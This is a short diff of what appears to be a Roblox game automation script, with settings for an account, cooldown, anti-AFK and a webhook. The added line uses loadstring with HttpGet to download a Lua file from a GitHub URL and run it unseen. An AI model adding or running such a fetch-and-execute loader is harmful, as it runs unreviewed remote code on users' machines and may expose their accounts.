@@ -2,6 +2,7 @@
 shared.Settings = {Account = "Account_Name",Enabled = true,Cooldown = 15,AntiAFK = true, -- // Dont touch~
     Webhook = "Webhook_Link_Here",
 };
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FlamesW/PSGenerator/home/AUT.lua"))();
 --]]
 
 repeat task.wait(0.1) until game:IsLoaded();
